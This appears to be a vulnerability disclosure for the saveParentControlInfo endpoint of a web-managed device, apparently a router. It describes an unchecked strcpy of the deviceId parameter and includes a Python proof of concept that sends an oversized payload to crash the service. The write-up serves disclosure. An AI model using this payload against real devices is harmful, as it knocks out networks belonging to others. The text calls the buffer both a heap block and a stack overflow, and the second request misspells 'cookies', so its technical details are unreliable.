In the function saveParentControlInfo, the program passes the content obtained from the parameter "deviceId" to the heap block s created by the program, and then directly copies the value of deviceId into the heap s using the strcpy function. There is no size check, which leads to a stack overflow vulnerability. An attacker can easily execute a denial-of-service attack using carefully crafted overflow data.

<img width="415" height="324" alt="image" src="https://github.com/user-attachments/assets/f9bb26dc-102b-4b7c-a36f-eb6c496a844b" />


POC：
```
from pwn import *
import requests

payload = b'a'*0x1000

url = "http://192.168.100.254/goform/saveParentControlInfo"

cookie = {"Cookie":"password=12345"}
data = {"deviceId": payload,"time": "1"}
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, caookies=cookie, data=data)
print(response.text)
```
